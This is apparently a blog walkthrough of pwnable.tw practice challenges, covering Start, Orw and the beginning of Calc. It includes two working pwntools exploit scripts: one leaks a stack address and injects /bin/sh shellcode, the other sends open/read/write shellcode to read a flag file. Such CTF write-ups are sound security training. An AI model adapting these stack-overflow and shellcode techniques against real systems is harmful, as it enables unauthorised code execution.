---
layout: post
title:  "Pwnable TW Walkthrough"
date:   2024-12-27 19:59:45 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## Start

The first challenge, we're given relatively small 32-bit binary:

```bash
$ checksec ./start
Arch:       i386-32-little
RELRO:      No RELRO
Stack:      No canary found
NX:         NX disabled
PIE:        No PIE (0x8048000)
Stripped:   No

$ file ./start
./start: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped
```

In addition to being statically linked, the binary has no libc, and seems to be a manually-written assembly file. IDA Decompilation attempt fails. \
By reading the assembly, it seems to be pushing the "Let's start the CTF:" string to the stack. It then 
writes this message to `stdout`. By using `stace`, we can see it then attempts to read 60 bytes off the user, right to the same stack address of the prompt string. Hence, linear stack overflow. \
The solution is simple - write shellcode, make sure the RA is set to its address. 

The main challenge is the fact that there's ASLR, and we have no leak. But notice the binary isn't PIE, hence we can jump to static code addresses. A very interesting code to jump to, is right before the call to `write`:

```bash
mov ecx, esp
mov dl, 14h
mov bl, 1
mov al, 4
int 80h  // sys_write
xor ebx, ebx
mov dl, 3Ch
mov al, 3
int 80h  // sys_read
```

This means we can easily obtain stack leak, as we can print values that resides within the stack. Win.

```python
#!/usr/bin/python3

from pwn import *
from time import sleep

HOST = 'chall.pwnable.tw'
PORT = 10000
context.arch='i386'
BINARY = './start'
GDB_SCRIPT = '''
b *_start+60
commands
    p "In start.."
end

c
'''

READ_BUF_SIZE = 60
WRITE_BUF_SIZE = 0x14
WRITE_STACK_BUF_TO_STDOUT_ADDR = 0x8048087
SHELLCODE = '''
mov ebx, {0}
xor ecx, ecx
xor edx, edx
push 0x0b
pop eax
int 0x80

BIN_SH:
.ascii "/bin/sh"
.byte 0x00
'''
# Unfortunately, x86 doesn't supports "lea ebx, [eip + BIN_SH]". Moved the raw offset for it..
OFFSET_TO_BIN_SH = 0x0e


def leak_stack_addr(p):
    buf = b'A' * WRITE_BUF_SIZE # pad
    buf += p32(WRITE_STACK_BUF_TO_STDOUT_ADDR)
    p.send(buf)
    leak_buf = p.recv(WRITE_BUF_SIZE)
    assert(len(leak_buf) == WRITE_BUF_SIZE)
    
    addr = u32(leak_buf[: 4])
    return addr

def write_and_jump_to_shellcode(p, shellcode_addr):
    buf = b'B' * WRITE_BUF_SIZE
    buf += p32(shellcode_addr) 
    shellcode_asm = SHELLCODE.format(shellcode_addr + OFFSET_TO_BIN_SH)
    log.info(f'Writing shellcode:\n{shellcode_asm}')
    buf += asm(shellcode_asm)
    buf += b'C' * (READ_BUF_SIZE - len(buf))
    p.send(buf)

def exploit(p):
    p.recvuntil(b"Let's start the CTF:")
    stack_leak = leak_stack_addr(p)    
    shellcode_addr = stack_leak + WRITE_BUF_SIZE
    log.info(f'stack_leak: {hex(stack_leak)} shellcode_addr: {hex(shellcode_addr)}')
    write_and_jump_to_shellcode(p, shellcode_addr)


def main():
    is_debug = False 
    is_remote = True
    if is_debug:
        p = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
    else:
        if is_remote:
            p = remote(HOST, PORT)
        else:
            p = process(BINARY)

    exploit(p)

    log.info('Win')
    p.interactive()

if __name__ == '__main__':
    main()
```

## Orw

Open, read, write. \

```bash
$ checksec orw
[*] '/home/itay/projects/pwnable_tw/orw/orw'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No

$ file orw
orw: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e60ecccd9d01c8217387e8b77e9261a1f36b5030, not stripped

$ ldd orw
    linux-gate.so.1 (0xee44a000)
    libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xee1fd000)
    /lib/ld-linux.so.2 (0xee44c000)
```

Using the previous challenge's access, we can copy the used `libc` and `ld-linux` to our local setup, and use `patchelf` to mimic the remote environment. \
Using `strace`, we can see the binary installs a "seccomp" by calling:

```bash
prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)  = 0
prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, {len=12, filter=0xff8c8cac}) = 0
```

After some readings, the `no_new_privs` bit prevents inherited processes to grant extra privileges, such as changing the `setuid` bit, or add capabilities. This may hint this challenge involves spawning a new process. We also see the shellcode is stored within a constant address within the binary. \
Writing an ORW shellcode solves this challenge easily. By default, my environment doesn't allows executing code from the .BSS. But since DEP is disabled on the remote, the following works:

```python
#!/usr/bin/python3

from pwn import *
from time import sleep

HOST = 'chall.pwnable.tw'
PORT = 10001
context.arch='i386'
BINARY = './orw'
GDB_SCRIPT = '''
b *0x804858a
commands
    p "In SC.."
end

c
'''

SHELLCODE_ADDR = 0x804a060
SHELLCODE = '''
mov ebx, {0}
xor ecx, ecx
xor edx, edx
push 0x05
pop eax
int 0x80

mov ebx, eax
mov ecx, {1}
mov edx, 0x40
push 0x03
pop eax
int 0x80

push 0x01
pop ebx
mov ecx, {1}
mov edx, 0x40
push 0x04
pop eax
int 0x80

FLAG:
.ascii "/home/orw/flag"
.byte 0x00

BUF:
.rept 0x40
.byte 0x00
.endr
'''
OFFSET_TO_FLAG = 0x31
OFFSET_TO_BUF = 0x40


def write_shellcode(p):
    shellcode_asm = SHELLCODE.format(SHELLCODE_ADDR + OFFSET_TO_FLAG, SHELLCODE_ADDR + OFFSET_TO_BUF)
    log.info(f'Writing shellcode:\n{shellcode_asm}')
    buf = asm(shellcode_asm)
    p.send(buf)

def exploit(p):
    p.recvuntil(b"Give my your shellcode:")
    write_shellcode(p)

def main():
    is_debug = False
    is_remote = True
    if is_debug:
        p = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
    else:
        if is_remote:
            p = remote(HOST, PORT)
        else:
            p = process(BINARY)

    exploit(p)

    log.info('Win')
    p.interactive()

if __name__ == '__main__':
    main()
```

## Calc

Microsoft calculator? 

```bash
$ checksec calc
[*] '/home/itay/projects/pwnable_tw/calc/calc'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No

$ file calc
calc: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=26cd6e85abb708b115d4526bcce2ea6db8a80c64, not stripped
```

The program allocates buffer of size `0x400` bytes on the stack, which shall be store the calculator expression. \
It reads up to `0x400` bytes, one after another. Interesitngly, there's off-by-one vuln:

```c
while ( i < size && read(0, &c, 1) != -1 && c != '\n' )
  {
    if ( c == '+' || c == '-' || c == '*' || c == '/' || c == '%' || c > '/' && c <= '9' )
    {
      i_cp = i++;
      addr[i_cp] = c;
    }
  }
  addr[i] = 0;
```

While up to `0x400` bytes are read into the `0x400` bytes buffer, the last assignment of `addr[i] = 0` occurs 1 byte past the buffer's end. \
Next, `init_pool` is called, nullifies all `101` bytes of the pool's buffer. Notice, that since the pool buffer was declared as `int[101]`, there might be alignment issues - potentially leaving uninitialized bytes. 

The interesting logic occurs within `parse_expr`. It has few sus notes:

1. The main loop is unbounded, as the only check being made is whether or not `expr[i]` is an operator. As long as its not the case, OOB-R would occur, eventually accessing the last `\x00` byte. At the end of the loop's body, there's a `!expr[i]` check. This means we even access `expr[i + 1]`, which is potentially 2 bytes past the end of the buffer.
